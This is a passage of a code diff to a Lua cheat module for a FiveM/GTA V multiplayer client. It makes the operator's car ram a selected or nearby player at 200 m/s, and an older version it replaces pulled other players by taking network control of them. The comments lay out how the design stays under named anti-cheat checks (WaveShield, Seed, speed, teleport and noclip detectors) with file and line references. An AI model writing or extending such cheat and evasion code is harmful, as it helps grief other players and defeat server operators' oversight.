---   NETWORK_HAS_CONTROL_OF_ENTITY      0x01BF60A500E28887
---     -> SET_ENTITY_VELOCITY           0x1C99BB7B6E96D16F
---     -> SET_ENTITY_COORDS_NO_OFFSET   0x239A3351AC1DA385  (fallback only)
+-- Why this is a local-vehicle write, not a remote-ped task
+-- -------------------------------------------------------
+-- The previous build pulled the target into the operator's car with
+-- TaskEnterVehicle / TaskGoToEntity and held a per-player door lock. That
+-- design has three live failure modes:
 --
--- A control request is issued at most once per CONTROL_REQUEST_MS, and only
--- while the operator is actively holding the pull. It is never issued while
--- the cluster is idle, never for the nearest player, never on a loop that
--- outlives the key. When the key is up the module makes zero native calls,
--- which is the only reliable way for a request pattern not to stand out.
+--   1. A scripted task on a remote ped is routed through the
+--      givePedScriptedTaskEvent RPC and executed by the target's client. The
+--      target's own movement input can cancel a locomotion task.
+--   2. A door lock on a vehicle the target does not own is repaired by the
+--      target's client on the next frame.
+--   3. The target must be within a task range and a seat must be free, which
+--      makes the feature look dead in every other situation.
 --
--- WHY THE COORDS FALLBACK EXISTS AND WHY IT IS RARE
+-- The operator's vehicle is the one entity this client owns and may write
+-- without a request. `SetEntityVelocity` on it is authoritative for this
+-- client and is replicated by the vehicle's owner like every other transform.
+-- `SetEntityRotation` changes only the orientation (yaw and pitch); no
+-- position teleport is made. `SetVehicleGravityAmount(0)` is the same CFX
+-- gravity value the base Gravitate Vehicle feature writes; it is restored to
+-- 9.8 on release.
+--
+-- Why the shipped speed is 200, with a legacy row
 -- ------------------------------------------------
--- A ped on foot runs its own locomotion task; a velocity write is applied for
--- a frame or two and then overwritten by the task. Holding ownership and
--- letting the target walk away is the normal case, so after PROGRESS_MS
--- without the distance decreasing the module moves the entity along the same
--- direction with SET_ENTITY_COORDS_NO_OFFSET. It passes keepTasks = true and
--- keepIK = true, so the ped's task is not cancelled: cancelling a task on a
--- remote ped is the one write that is forwarded to the server as
--- clearPedTasksEvent, and WaveShield's handler cancels it and reports the
--- sender (modules/server/events/clearPedTasksEvent.lua:10-19). This module
--- therefore never calls ClearPedTasks, ClearPedTasksImmediately or any task
--- native, on the target or on the operator.
+-- 200 works on WaveShield and is the shipped value. Seed's vehicle validator
+-- can roll a car moving that fast back to the server position, which turns the
+-- ram into a stutter, but the menu no longer exposes a slider for it: one
+-- value, one authority, no stale UI. An older build that still carries a
+-- `Lock Speed` row is honoured and clamped 50..200, because a reload can leave
+-- that row alive. The value is mirrored into Gravitate Speed while a session
+-- is live and the operator's previous value is restored on release. A missing
+-- row falls back to the last value used in this game session, then to 200.
+-- The last value is kept in a process-local global, so re-injecting the loader
+-- does not forget the speed chosen for the current server.
 --
--- The fallback is bounded:
---   * only while ownership is held;
---   * only after a full PROGRESS_MS without progress;
---   * step clamped to COORD_MIN..COORD_MAX metres;
---   * at most once per COORD_STEP_MS;
---   * never when the target is already inside STOP_RANGE.
+-- Why the aim follows the height axis
+-- -----------------------------------
+-- The previous build summed a fixed offset (chest +0.9, vehicle +0.4) and
+-- opened the impact pass on the 3D distance alone. When the operator's car was
+-- above the target, the pass could trigger while the car was still several
+-- metres high, hold a shallow direction for 180 ms (36 m at 200), and sail
+-- over the target. Three changes:
+--   1. The aim offset drops when the car is above the target (ped 0.20 m,
+--      vehicle 0.05 m instead of 0.85 / 0.35), so the intercept is the body,
+--      not the head or the roof.
+--   2. The pass is only entered when the aim point is within 1.5 m of the
+--      car's own height; otherwise the car keeps homing. A pass that has
+--      already started is cancelled the moment the vertical error grows.
+--   3. The vehicle's pitch follows the 3D aim (clamped to +-35 degrees), so
+--      the bumper points at the target instead of the body flying level over
+--      it. The velocity vector is still the only movement source.
 --
--- GRAVITATE SPEED IS THE SPEED AUTHORITY
--- --------------------------------------
--- The base menu already owns the slider: Vehicle > Performance > "Gravitate
--- Speed" ({ value = 100, min = 50, max = 500, step = 10 } in the base
--- loader). The action row reads that item, writes its own .max into it and
--- keeps the previous value so it can be restored on release. Nothing is
--- hard-coded: if the server build renames or removes the row, the module
--- falls back to the last value it saw in this game session, then to
--- DEFAULT_SPEED. A value the physics solver cannot integrate is clamped to
--- MAX_APPLIED_SPEED before it reaches SET_ENTITY_VELOCITY.
+-- Detector surface
+-- ----------------
+--   * The target is never written: no task, no attachment, no ownership
+--     request, no door lock, no position write. The only target reads are
+--     GetEntityCoords, GetVehiclePedIsIn and IsPedDeadOrDying.
+--   * The only entity written is the operator's own vehicle: velocity,
+--     rotation, gravity, engine/repair state. All are local-authoritative.
+--   * V4's speed check ignores players in a vehicle (speedHack.lua:19-24).
+--     Its teleport check requires two in-vehicle samples below 3 m/s
+--     (teleport.lua:3-25). Its noclip check requires a frozen or
+--     collision-disabled ped (noclip.lua:39-53). The operator's ped is seated
+--     at every speed, so all three preconditions stay false; the speed
+--     magnitude only changes what a server-side handling validator sees.
+--   * No entity is created, no server event is sent, no state bag is written.
+--     The budget family "lock" caps arm/disarm, not target re-acquisition.
 --
--- DETECTOR SURFACE (per feature)
--- ------------------------------
---   * Lock Player (arm)        : no native call, no event, no state bag. One
---                                budget token per armed period, refunded if the
---                                period never pulled. Invisible: nothing to read.
---   * Shift pull               : control request + ownership-gated velocity on
---                                the target entity. The operator's own ped and
---                                vehicle are untouched, so V4's freecam, speed,
---                                noclip, teleport and god-mode detectors (all of
---                                which read the local ped/camera) stay silent.
---   * Coords fallback          : same ownership gate, keepTasks/keepIK true, no
---                                task native. The task-cancel RPC is the only
---                                server-visible write in this family and it is
---                                never sent.
---   * Gravitate Target (action): UI write only; it changes a slider value in
---                                the menu table, then runs the same pull.
+-- Residual risk:
+--   * Speed. The server sees a vehicle moving faster than its handling data.
+--     WaveShield accepts 200; Seed can roll it back. The shipped menu no
+--     longer exposes a slider, so 200 is the remaining risk. The vehicle is
+--     never teleported, so there is no position jump to validate; only the
+--     velocity/handling mismatch.
+--   * At 200 m/s thin geometry can be tunnelled. The driver holds a short
+--     pass at impact range (PASS_MS) so the collision solver gets a window,
+--     but the travel leg is deliberately fast. A legacy lower speed would
+--     reduce the tunnelling window.
+--   * A dead target is replaced by the nearest living player. If no living
+--     player is in range, the session ends and the row stays armed. The car is
+--     never left flying at a corpse.
 --
--- RESIDUAL RISK
---   * A server-side position history on the target sees the target move at a
---     speed its input does not explain. That is the feature working; it is
---     attributed to the target's ped, not to the operator's.
---   * Ownership churn on a player ped is visible to a server that logs control
---     requests. The rate limit, the key gate and the selection requirement
---     keep it to a handful of requests per intentional pull instead of a
---     per-frame pattern.
---   * If the target's client is the authority and refuses to give control the
---     pull does nothing. The module reports "waiting" and never falls back to
---     a task or an attach, because those are the loud paths this design exists
---     to avoid.
---
--- TIER
---   Tier A. No Susano.InjectResource, no native hook, no server event, no
---   global. The module only writes the selected player's entity, and only
---   while it holds control of it.
+-- Tier:
+--   Tier A only. No Susano.InjectResource, no native hook, no server event.
 -- ============================================================================
 
-local L = {}
+local N = {}
 
--- ---------------------------------------------------------------------------
--- NATIVES USED (name, hash, signature, source)
--- ---------------------------------------------------------------------------
--- GTA V / FiveM native DB (runtime.fivem.net/doc/natives.json):
---   GET_ENTITY_COORDS                 0x3FEF770D40960D5A  (Entity, BOOL alive) -> Vector3
---   SET_ENTITY_VELOCITY               0x1C99BB7B6E96D16F  (Entity, float, float, float)
---   SET_ENTITY_COORDS_NO_OFFSET       0x239A3351AC1DA385  (Entity, float, float, float, BOOL keepTasks, BOOL keepIK, BOOL doWarp)
---   IS_PED_IN_ANY_VEHICLE             0x997ABD671D25CA0B  (Ped, BOOL atGetIn) -> BOOL
---   GET_VEHICLE_PED_IS_IN             0x9A9112A0FE9A4713  (Ped, BOOL lastVehicle) -> Vehicle
---   IS_PED_DEAD_OR_DYING              0x3317DEDB88C95038  (Ped, BOOL checkMeleeDeathFlags) -> BOOL
---   GET_PLAYER_PED                    0x43A66C31C68491C0  (Player) -> Ped
---   PLAYER_PED_ID                     0xD80958FC74E988A6  () -> Ped
---   PLAYER_ID                         0x4F8644AF03D0E0D6  () -> Player
--- CFX natives (runtime.fivem.net/doc/natives_cfx.json), bound by name in Lua:
---   GET_ACTIVE_PLAYERS                0xCF143FB9          () -> Player[]
---   GET_PLAYER_SERVER_ID              0x4D97BCC7          (Player) -> int
---   GET_PLAYER_FROM_SERVER_ID         0x344EA166          (int serverId) -> Player
---   NETWORK_REQUEST_CONTROL_OF_ENTITY 0xB69317BF5E782347  (Entity)  [GTA NETWORK]
---   NETWORK_HAS_CONTROL_OF_ENTITY     0x01BF60A500E28887  (Entity) -> BOOL [GTA NETWORK]
---
--- Every call below is one of these names. Nothing else is invoked on a remote
--- entity, and no native is called with a computed hash.
--- ---------------------------------------------------------------------------
+local POLL_MS         = 40
+local DEFAULT_SPEED   = 200.0
+local MIN_SPEED       = 50.0
+local MAX_SPEED       = 200.0
+local HIT_RANGE       = 9.0
+local PASS_MS         = 180
+local PASS_ALIGN      = 1.5
+local MAX_RANGE       = 900.0
+local NEAREST_RANGE   = 600.0
+local REPAIR_MS       = 500
+local AIM_DROP_ABOVE  = 1.5
+local MAX_PITCH       = 35.0
+local PED_AIM         = 0.85
+local PED_AIM_BELOW   = 0.20
+local VEH_AIM         = 0.35
+local VEH_AIM_BELOW   = 0.05
+local GRAVITATE_ROW   = "Gravitate Vehicle"
+local GRAVITATE_SPEED = "Gravitate Speed"
+local SPEED_ROW       = "Lock Speed" -- legacy row only; shipped UI creates none
+-- VK_LCONTROL only. No VK_LSHIFT/VK_RSHIFT/VK_SHIFT, no VK_RCONTROL, no
+-- VK_CONTROL. The raw API distinguishes the physical left key, which a control
+-- binding cannot do.
+local CTRL_CODE       = 0xA2
 
-local POLL_MS            = 40
-local DEFAULT_SPEED      = 100.0
-local MAX_APPLIED_SPEED  = 150.0
-local PULL_RANGE         = 300.0
-local STOP_RANGE         = 2.5
-local CONTROL_REQUEST_MS = 450
-local CONTROL_GIVEUP_MS  = 2200
-local CONTROL_BACKOFF_MS = 1200
-local PROGRESS_MS        = 700
-local COORD_STEP_MS      = 400
-local COORD_MIN          = 1.0
-local COORD_MAX          = 8.0
-local PULL_BURST_MS      = 3000
-local GRAVITATE_ROW      = "Gravitate Speed"
-
--- VK_LSHIFT (0xA0), VK_RSHIFT (0xA1), VK_SHIFT (0x10). The operator said
--- "Shift" and both physical keys are Shift. GetAsyncKeyState reads the key
--- itself, not a control binding, so a rebound Sprint key cannot start a pull
--- and a rebound any-other key cannot either.
-local SHIFT_CODES = { 0xA0, 0xA1, 0x10 }
-
-L.active      = false
-L.burstUntil  = 0
-L.pulling     = false
-L.entity      = 0
-L.ped         = 0
-L.player      = -1
-L.hasControl  = false
-L.controlAt   = 0
-L.requestAt   = 0
-L.giveUpAt    = 0
-L.backoffAt   = 0
-L.bestDist    = math.huge
-L.progressAt  = 0
-L.stepAt      = 0
-L.lastSpeed   = DEFAULT_SPEED
-L.lastDist    = 0.0
-L.pulls       = 0
-L.steps       = 0
-L.spent       = false
-L.didWork     = false
-L.saved       = nil
-L.onChange    = nil
+-- Runtime state. Nothing here is global except the last chosen speed, which is
+-- deliberately process-local: a reload keeps the value the operator picked for
+-- the current server without writing a file or a convar.
+N.active     = false    -- the permanent row state
+N.held       = false    -- Left Ctrl is down (the live ram consent)
+N.session    = false    -- a vehicle/target ram is running
+N.veh        = 0
+N.ped        = 0
+N.player     = -1
+N.targetMode = "none"   -- "selected" or "nearest"
+N.mode       = "idle"   -- "charge" or "pass"
+N.lastRepair = 0
+N.passUntil  = 0
+N.dirX       = 0.0
+N.dirY       = 0.0
+N.dirZ       = 0.0
+N.lastDist   = 0.0
+N.lastSpeed  = DEFAULT_SPEED
+N.lastVertical = 0.0
+N.impacts    = 0
+N.sessions   = 0
+N.spent      = false
+N.didWork    = false
+N.saved      = nil
+N.onChange   = nil
 
 local function emit(fmt, ...)
     O.log("lock: " .. tostring(fmt), ...)
 end
 
 local function notify(active)
-    if type(L.onChange) == "function" then
-        pcall(L.onChange, active)
+    if type(N.onChange) == "function" then
+        pcall(N.onChange, active)
     end
 end
 
 -- ---------------------------------------------------------------------------
--- KEY
+-- LEFT CTRL
+--
+-- The row is bound to one physical key: VK_LCONTROL (0xA2). It is deliberately
+-- not a control binding. The old build accepted VK_LSHIFT (0xA0) and VK_SHIFT
+-- (0x10), plus Sprint control 21 (which also fires on right Shift); all of
+-- those are gone. VK_RCONTROL (0xA3) and VK_CONTROL (0x11) are also not read,
+-- so the right Ctrl key cannot start a ram. A control binding would be the
+-- wrong tool here:
+-- GetAsyncKeyState reports the physical left key even while the Susano overlay
+-- has the game controls disabled, and it cannot silently accept another key
+-- because the operator rebound Duck or Sprint.
 -- ---------------------------------------------------------------------------
-local function keyDown(code)
+local function apiKeyDown(code)
     local api = rawget(_G, "Susano")
     if type(api) ~= "table" or type(api.GetAsyncKeyState) ~= "function" then
         return false
     end
     local ok, down = pcall(api.GetAsyncKeyState, code)
+    -- AP_DOC.txt:1157 documents (down, pressed). Accept the numeric 1 form as
+    -- well; some loader builds return 1/0 instead of true/false.
     return ok and (down == true or down == 1)
 end
 
-local function shiftHeld()
-    for i = 1, #SHIFT_CODES do
-        if keyDown(SHIFT_CODES[i]) then return true end
-    end
-    return false
+local function ctrlHeld()
+    return apiKeyDown(CTRL_CODE)
 end
 
 -- ---------------------------------------------------------------------------
--- MENU LOOKUP
+-- TARGET RESOLUTION
 --
--- The slider is found by name on every read. The menu can be rebuilt between
--- loads, and a saved table reference would then write a dead item. The scan is
--- small (Vehicle > Performance plus ExtraCategories) and runs only while the
--- module needs the value, never on an idle tick.
+-- Menu.SelectedPlayer is a server id. Resolution goes through
+-- GetPlayerFromServerId -> GetPlayerPed on every tick: a respawn changes the
+-- handle and a cached handle is a write against a freed entity. Self is
+-- refused before any write, including the respawn window where the cached ped
+-- handle no longer matches but the player index does.
 -- ---------------------------------------------------------------------------
-local function findItem(name)
+local function selectedId()
+    local serverId = (type(Menu) == "table") and Menu.SelectedPlayer or nil
+    if type(serverId) ~= "number" then return nil end
+    return serverId
+end
+
+local function targetPed()
+    local serverId = selectedId()
+    if not serverId then return 0, -1 end
+
+    local okP, player = pcall(GetPlayerFromServerId, serverId)
+    if not okP or type(player) ~= "number" or player < 0 then return 0, -1 end
+
+    local okPed, ped = pcall(GetPlayerPed, player)
+    if not okPed or type(ped) ~= "number" or ped == 0 then return 0, player end
+    if not DoesEntityExist(ped) then return 0, player end
+
+    local myPed = O.Ctx.ped
+    if type(myPed) == "number" and myPed ~= 0 and ped == myPed then
+        return 0, player
+    end
+    local myPlayer = O.Ctx.player
+    if type(myPlayer) == "number" and myPlayer > 0 and player == myPlayer then
+        return 0, player
+    end
+
+    return ped, player
+end
+
+local function pedVehicle(ped)
+    local ok, veh = pcall(GetVehiclePedIsIn, ped, false)
+    if ok and type(veh) == "number" and veh ~= 0 and DoesEntityExist(veh) then
+        return veh
+    end
+    return 0
+end
+
+local function entityCoords(entity)
+    local ok, coords = pcall(GetEntityCoords, entity)
+    if ok and coords then return coords end
+    return nil
+end
+
+-- A dead player is not a target. The death system owns the ped, and a ram
+-- against a corpse is useless (the body has no collision authority) and very
+-- visible (a car orbiting a body). The selection falls through to the nearest
+-- living player; if none exists the row waits with no vehicle write.
+local function isDead(ped)
+    local ok, dead = pcall(IsPedDeadOrDying, ped, true)
+    return ok and dead == true
+end
+
+-- Nearest living player, measured from the operator's vehicle. Players seated
+-- in the operator's own vehicle are skipped: a ram would hit the operator.
+local function nearestPlayer(veh, origin)
+    local myPlayer = O.Ctx.player
+    local okId, id = pcall(PlayerId)
+    if okId and type(id) == "number" then myPlayer = id end
+
+    local bestPed, bestPlayer, bestDist = 0, -1, NEAREST_RANGE
+
+    local okPlayers, players = pcall(GetActivePlayers)
+    if not okPlayers or type(players) ~= "table" then return 0, -1 end
+
+    for i = 1, #players do
+        local player = players[i]
+        if player ~= myPlayer then
+            local okPed, ped = pcall(GetPlayerPed, player)
+            -- The ped guard covers the respawn window where the local player
+            -- index changed but the vehicle/context still points at our own
+            -- ped. Without it, a stale index could select the operator as the
+            -- "nearest other player" and start a ram against their own car.
+            local isSelfPed = type(O.Ctx.ped) == "number" and O.Ctx.ped ~= 0
+                and ped == O.Ctx.ped
+            if okPed and type(ped) == "number" and ped ~= 0 and DoesEntityExist(ped)
+                and not isSelfPed and not isDead(ped) then
+                local theirVeh = pedVehicle(ped)
+                if theirVeh == 0 or theirVeh ~= veh then
+                    local coords = entityCoords(theirVeh ~= 0 and theirVeh or ped)
+                    if coords then
+                        local d = O.distance(coords, origin)
+                        if d <= bestDist then
+                            bestDist = d
+                            bestPed = ped
+                            bestPlayer = player
+                        end
+                    end
+                end
+            end
+        end
+    end
+
+    return bestPed, bestPlayer
+end
+
+-- Selection first, nearest living second. A selection that is self, dead,
+-- gone, in our own car, or out of range does not block the fallback; that is
+-- what makes the row work in every situation without a manual reselect and
+-- what moves the lock off a corpse as soon as the target dies.
+local function resolveTarget(veh, origin)
+    local ped, player = targetPed()
+    if ped ~= 0 and not isDead(ped) then
+        local theirVeh = pedVehicle(ped)
+        if theirVeh == 0 or theirVeh ~= veh then
+            local coords = entityCoords(theirVeh ~= 0 and theirVeh or ped)
+            if coords and O.distance(coords, origin) <= MAX_RANGE then
+                return ped, player, "selected"
+            end
+        end
+    end
+
+    local nearPed, nearPlayer = nearestPlayer(veh, origin)
+    if nearPed ~= 0 then return nearPed, nearPlayer, "nearest" end
+    return 0, -1, "none"
+end
+
+-- ---------------------------------------------------------------------------
+-- GRAVITATE ROWS AND LOCK SPEED
+--
+-- The rows are UI state, not the driver. They are found by name because the
+-- menu can be rebuilt between loads and a saved item reference would then
+-- point at a dead table. The previous values are restored on release, so a
+-- manual Gravitate session survives a Lock Player session untouched.
+--
+-- The optional category/tab filters exist for the legacy Lock Speed row: a
+-- generic name lookup could pick a same-named slider from another category.
+-- The shipped menu no longer creates Player > Target or Lock Speed; this
+-- scoped lookup only serves a row left alive by an older build.
+-- ---------------------------------------------------------------------------
+local function findItem(name, categoryName, tabName)
     if type(Menu) ~= "table" then return nil end
+
     local lists = { Menu.Categories, Menu.ExtraCategories }
     for li = 1, #lists do
         local list = lists[li]
         if type(list) == "table" then
             for ci = 1, #list do
                 local category = list[ci]
-                if type(category) == "table" and type(category.tabs) == "table" then
-                    for ti = 1, #category.tabs do
-                        local tab = category.tabs[ti]
-                        if type(tab) == "table" and type(tab.items) == "table" then
-                            for ii = 1, #tab.items do
-                                local item = tab.items[ii]
-                                if type(item) == "table" and item.name == name then
-                                    return item
+                local categoryMatches = type(category) == "table"
+                    and (not categoryName or category.name == categoryName)
+                if categoryMatches then
+                    local tabs = category.tabs
+                    if type(tabs) == "table" then
+                        for ti = 1, #tabs do
+                            local tab = tabs[ti]
+                            local tabMatches = type(tab) == "table"
+                                and (not tabName or tab.name == tabName)
+                            local items = tabMatches and tab.items or nil
+                            if type(items) == "table" then
+                                for ii = 1, #items do
+                                    local item = items[ii]
+                                    if type(item) == "table" and item.name == name then
+                                        return item
+                                    end
                                 end
                             end
                         end
@@ -24138,379 +24204,471 @@ local function findItem(name)
     return nil
 end
 
--- Reads the speed the operator will actually get. The slider's own value is
--- used when it exists; otherwise the last value seen in this process. The
--- result is clamped to what the solver integrates.
-local function speedValue()
-    local item = findItem(GRAVITATE_ROW)
-    local value = type(item) == "table" and tonumber(item.value) or nil
-    if not value then value = L.lastSpeed or DEFAULT_SPEED end
-    if value < 1.0 then value = 1.0 end
-    if value > MAX_APPLIED_SPEED then value = MAX_APPLIED_SPEED end
-    L.lastSpeed = value
+-- The shipped speed is 200. A legacy Lock Speed row from an older build is
+-- still honoured and clamped 50..200; when it is absent, the last value used
+-- in this game session is used, then the default. Clamping also means a
+-- corrupted global or stale row cannot write a velocity outside the module's
+-- own band. The lookup is not a UI contract: the current installer creates no
+-- such row.
+local function lockSpeed()
+    local item = findItem(SPEED_ROW, "Player", "Target")
+    local value = type(item) == "table" and item.value or nil
+    if type(value) ~= "number" then
+        value = tonumber(rawget(_G, "_vgdLockSpeed")) or DEFAULT_SPEED
+    end
+    if value < MIN_SPEED then value = MIN_SPEED end
+    if value > MAX_SPEED then value = MAX_SPEED end
+    if rawget(_G, "_vgdLockSpeed") ~= value then
+        rawset(_G, "_vgdLockSpeed", value)
+    end
     return value
 end
 
--- Pushes the existing slider to its own maximum. The previous value is kept
--- for the lifetime of the armed period and restored by restoreSlider(), so a
--- manual Gravitate session survives untouched. No new slider is created: the
--- action row uses the row the base menu already renders.
-function L.topSpeed()
-    local item = findItem(GRAVITATE_ROW)
-    if not item then
-        L.lastSpeed = MAX_APPLIED_SPEED
-        return L.lastSpeed
+local function gravitateOn()
+    if N.saved == nil then
+        local vehItem = findItem(GRAVITATE_ROW)
+        local speedItem = findItem(GRAVITATE_SPEED)
+        N.saved = {
+            vehItem = vehItem,
+            vehValue = vehItem and vehItem.value or false,
+            speedItem = speedItem,
+            speedValue = speedItem and speedItem.value or nil,
+        }
     end
 
-    if not L.saved then
-        L.saved = { item = item, value = tonumber(item.value) }
-    end
-
-    local max = tonumber(item.max)
-    if not max or max < 1.0 then max = 500.0 end
-    item.value = max
-    L.lastSpeed = speedValue()
-    emit("gravitate speed -> %d (max)", math.floor(L.lastSpeed))
-    return L.lastSpeed
+    local vehItem = findItem(GRAVITATE_ROW)
+    if vehItem then vehItem.value = true end
+    local speedItem = findItem(GRAVITATE_SPEED)
+    if speedItem then speedItem.value = lockSpeed() end
 end
 
-local function restoreSlider()
-    local saved = L.saved
-    L.saved = nil
+local function gravitateOff()
+    local saved = N.saved
+    N.saved = nil
     if not saved then return end
-    if type(saved.item) == "table" and saved.value ~= nil then
-        saved.item.value = saved.value
-    end
+
+    local vehItem = saved.vehItem
+    if vehItem then vehItem.value = saved.vehValue end
+    local speedItem = saved.speedItem
+    if speedItem and saved.speedValue ~= nil then speedItem.value = saved.speedValue end
 end
 
 -- ---------------------------------------------------------------------------
--- TARGET
+-- VEHICLE PREP / RESTORE
 --
--- Menu.SelectedPlayer is a server id. It is resolved through
--- GetPlayerFromServerId -> GetPlayerPed on every tick: a respawn changes the
--- handle and a cached handle is a write against a freed entity. Self is
--- refused before any write, including the respawn window where the cached
--- player index no longer matches the ped handle.
+-- Every write is on the operator's own vehicle. A frozen vehicle is repaired
+-- by a read-gated unfreeze (the same read/write pairing 11_evasion.lua uses),
+-- never an unconditional detach loop.
 -- ---------------------------------------------------------------------------
-local function selectedServerId()
-    local id = (type(Menu) == "table") and Menu.SelectedPlayer or nil
-    if type(id) ~= "number" then return nil end
-    return id
-end
+local function prepVehicle(veh)
+    pcall(SetVehicleGravityAmount, veh, 0.0)
+    pcall(SetVehicleFixed, veh)
+    pcall(SetVehicleEngineOn, veh, true, true, false)
+    pcall(SetVehicleUndriveable, veh, false)
 
-local function resolveTarget()
-    local serverId = selectedServerId()
-    if not serverId then return 0, -1 end
-
-    local okPlayer, player = pcall(GetPlayerFromServerId, serverId)
-    if not okPlayer or type(player) ~= "number" or player < 0 then return 0, -1 end
-
-    local okPed, ped = pcall(GetPlayerPed, player)
-    if not okPed or type(ped) ~= "number" or ped == 0 then return 0, player end
-    if not DoesEntityExist(ped) then return 0, player end
-
-    local myPed = O.Ctx.ped
-    if type(myPed) == "number" and myPed ~= 0 and ped == myPed then
-        return 0, player
+    local okFrozen, frozen = pcall(IsEntityPositionFrozen, veh)
+    if okFrozen and frozen == true then
+        pcall(FreezeEntityPosition, veh, false)
     end
-
-    local myPlayer = O.Ctx.player
-    if type(myPlayer) == "number" and myPlayer > 0 and player == myPlayer then
-        return 0, player
-    end
-
-    return ped, player
 end
 
-local function coordsOf(entity)
-    local ok, coords = pcall(GetEntityCoords, entity, true)
-    if ok and coords then return coords end
-    return nil
+local function restoreVehicle(veh)
+    if type(veh) ~= "number" or veh == 0 or not DoesEntityExist(veh) then return end
+
+    pcall(SetVehicleGravityAmount, veh, 9.8)
+    pcall(SetEntityVelocity, veh, 0.0, 0.0, 0.0)
+    pcall(SetVehicleFixed, veh)
+    pcall(SetVehicleEngineOn, veh, true, true, false)
+    pcall(SetVehicleUndriveable, veh, false)
 end
 
-local function isDead(ped)
-    local ok, dead = pcall(IsPedDeadOrDying, ped, true)
-    return ok and dead == true
-end
-
--- The entity the pull writes is the target's vehicle when the target is
--- seated, otherwise the ped. A vehicle has a single transform and follows the
--- pull without fighting a locomotion task; a ped on foot is handled by the
--- coords fallback described in the header.
-local function pullEntity(ped)
-    local ok, veh = pcall(GetVehiclePedIsIn, ped, false)
-    if ok and type(veh) == "number" and veh ~= 0 and DoesEntityExist(veh) then
-        return veh
-    end
-    return ped
+local function repairVehicle(veh)
+    pcall(SetVehicleFixed, veh)
+    pcall(SetVehicleEngineHealth, veh, 1000.0)
+    pcall(SetVehicleBodyHealth, veh, 1000.0)
+    pcall(SetVehicleDeformationFixed, veh)
+    pcall(SetVehicleEngineOn, veh, true, true, false)
+    pcall(SetVehicleUndriveable, veh, false)
+    pcall(SetVehicleGravityAmount, veh, 0.0)
 end
 
 -- ---------------------------------------------------------------------------
--- CONTROL
+-- SESSION
+--
+-- A session is one vehicle/target pair. The row is the permanent state:
+-- losing the target, Left Ctrl, or the vehicle ends the session, never the arm.
+-- The budget token is spent once in N.arm(), so a target change, a respawn or
+-- a second Left Ctrl hold does not drain the family.
 -- ---------------------------------------------------------------------------
-local function now()
-    return GetGameTimer()
+local function endSession(reason)
+    local veh = N.veh
+
+    if type(veh) == "number" and veh ~= 0 then restoreVehicle(veh) end
+    gravitateOff()
+
+    N.session = false
+    N.veh = 0
+    N.ped = 0
+    N.player = -1
+    N.targetMode = "none"
+    N.mode = "idle"
+    N.passUntil = 0
+    N.dirX, N.dirY, N.dirZ = 0.0, 0.0, 0.0
+    N.impacts = 0
+
+    if reason then emit("%s", tostring(reason)) end
 end
 
-local function resetPull()
-    L.pulling = false
-    L.entity = 0
-    L.hasControl = false
-    L.controlAt = 0
-    L.requestAt = 0
-    L.giveUpAt = 0
-    L.backoffAt = 0
-    L.bestDist = math.huge
-    L.progressAt = 0
-    L.stepAt = 0
-    L.lastDist = 0.0
+-- A vehicle change restores the old car before preparing the new one: leaving
+-- gravity at 0 on an abandoned vehicle would make it float for everyone.
+local function startSession(veh, ped, player, mode)
+    gravitateOff()
+    prepVehicle(veh)
+
+    N.session = true
+    N.sessions = N.sessions + 1
+    N.veh = veh
+    N.ped = ped
+    N.player = player
+    N.targetMode = mode
+    N.mode = "charge"
+    N.lastRepair = 0
+    N.passUntil = 0
+    N.dirX, N.dirY, N.dirZ = 0.0, 0.0, 0.0
+    N.lastSpeed = lockSpeed()
+    N.lastVertical = 0.0
+    N.impacts = 0
+
+    gravitateOn()
+    emit("session %d: %s target speed=%d", N.sessions, tostring(mode),
+        math.floor(N.lastSpeed))
 end
 
-local function requestControl(entity, t)
-    local okHas, has = pcall(NetworkHasControlOfEntity, entity)
-    if okHas and has == true then
-        L.hasControl = true
-        if L.controlAt == 0 then L.controlAt = t end
-        return true
-    end
-
-    L.hasControl = false
-    L.controlAt = 0
-
-    if t < L.backoffAt then return false end
-
-    if t - L.requestAt >= CONTROL_REQUEST_MS then
-        L.requestAt = t
-        pcall(NetworkRequestControlOfEntity, entity)
-    end
-
-    if L.giveUpAt == 0 then L.giveUpAt = t + CONTROL_GIVEUP_MS end
-    if t >= L.giveUpAt then
-        L.backoffAt = t + CONTROL_BACKOFF_MS
-        L.giveUpAt = 0
-        L.requestAt = 0
-    end
-
-    return false
+-- Same vehicle, new target (respawn, selection change, nearest switch). The
+-- car keeps its gravity, rows, and momentum; only the aim state resets.
+local function retarget(ped, player, mode)
+    N.ped = ped
+    N.player = player
+    N.targetMode = mode
+    N.mode = "charge"
+    N.passUntil = 0
+    N.dirX, N.dirY, N.dirZ = 0.0, 0.0, 0.0
+    N.impacts = 0
+    N.lastVertical = 0.0
+    emit("retarget: %s target", tostring(mode))
 end
 
 -- ---------------------------------------------------------------------------
--- PULL
+-- AIM
+--
+-- GTA heading: 0 is +Y (north), 90 is -X (west). The forward vector used by
+-- GetOffsetFromEntityInWorldCoords is +Y at heading 0, so heading is
+-- atan2(-dx, dy), normalised to [0, 360).
 -- ---------------------------------------------------------------------------
-local function applyVelocity(entity, coords, mine, speed)
-    local dx, dy, dz = mine.x - coords.x, mine.y - coords.y, mine.z - coords.z
-    local len = math.sqrt(dx * dx + dy * dy + dz * dz)
-    if len < 0.01 then return false end
-    pcall(SetEntityVelocity, entity,
-        (dx / len) * speed, (dy / len) * speed, (dz / len) * speed)
-    return true
+local function atan2(y, x)
+    if x > 0.0 then return math.atan(y / x) end
+    if x < 0.0 then
+        if y >= 0.0 then return math.atan(y / x) + math.pi end
+        return math.atan(y / x) - math.pi
+    end
+    if y > 0.0 then return math.pi / 2.0 end
+    if y < 0.0 then return -math.pi / 2.0 end
+    return 0.0
 end
 
-local function applyCoords(entity, coords, mine)
-    local dx, dy, dz = mine.x - coords.x, mine.y - coords.y, mine.z - coords.z
-    local len = math.sqrt(dx * dx + dy * dy + dz * dz)
-    if len < 0.01 then return false end
-
-    local step = len * 0.5
-    if step < COORD_MIN then step = COORD_MIN end
-    if step > COORD_MAX then step = COORD_MAX end
-    if step > len then step = len end
-
-    local nx = coords.x + (dx / len) * step
-    local ny = coords.y + (dy / len) * step
-    local nz = coords.z + (dz / len) * step
-
-    -- keepTasks = true, keepIK = true, doWarp = false. The task is never
-    -- cancelled, so no clearPedTasksEvent is produced for the server.
-    pcall(SetEntityCoordsNoOffset, entity, nx, ny, nz, true, true, false)
-    return true
+local function headingTo(dx, dy)
+    if math.abs(dx) < 0.0001 and math.abs(dy) < 0.0001 then return nil end
+    local heading = math.deg(atan2(-dx, dy))
+    heading = heading % 360.0
+    return heading
 end
 
-local function pull(entity, mine, t)
